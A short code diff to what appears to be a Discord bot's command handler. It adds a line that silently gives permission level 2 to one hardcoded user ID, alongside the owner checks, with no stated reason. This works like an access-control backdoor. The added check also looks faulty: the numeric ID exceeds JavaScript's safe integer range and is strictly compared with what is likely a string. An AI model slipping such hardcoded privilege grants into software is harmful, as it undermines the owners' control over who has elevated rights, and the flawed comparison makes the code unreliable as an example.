@@ -16,6 +16,7 @@ exports.run = async(bot, message, args, level) => {
         console.warn("Admin role permission check error");
         //message.channel.send('An error has occurred.')
     }
+    if (message.author.id === 353269206827008000) permlvl = 2;
     if(message.author.id === message.guild.owner.id) permlvl = 3;
     if(message.author.id === bot.config.owner) permlvl = 4;
 
